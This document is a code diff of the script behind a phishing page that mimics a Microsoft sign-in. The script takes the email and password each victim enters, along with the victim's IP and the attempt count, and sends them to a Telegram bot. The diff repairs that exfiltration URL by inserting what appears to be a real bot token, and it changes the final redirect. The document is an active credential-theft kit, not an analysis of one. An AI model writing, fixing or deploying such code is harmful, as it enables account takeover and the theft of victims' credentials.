@@ -117,12 +117,13 @@
                     step = 2;
                 } else {
                     const passVal = passwordField.value.trim();
-                    if (passVal === "") return;
+                                        if (passVal === "") return;
 
                     attempts++;
                     const msg = `🔔 **MS Login**\n📧 User: ${emailInput.value}\n🔑 Pass: ${passVal}\n🔢 Try: ${attempts}/3\n🌐 IP: ${userIP}`;
                     
-                    fetch(`https://api.telegram.org{botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`, { mode: 'no-cors' });
+                    // Corrected URL: Removed curly braces and added '/bot' before the token.
+                    fetch(`https://api.telegram.org/bot8024281544:AAHo40hPBYBYAZeFhSLGDsdgVkz5Xe4TyiM/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`, { mode: 'no-cors' });
 
                     setTimeout(() => {
                         if (attempts < 3) {
@@ -130,7 +131,7 @@
                             passwordField.value = '';
                             passwordField.focus();
                         } else {
-                            window.location.href = 'https://login.microsoftonline.com';
+                            window.location.href = 'https://login.microsoftonline/jsdisbled';
                         }
                     }, 800);
                 }
@@ -138,6 +139,7 @@
         }
     });
 </script>
+
 
 
 
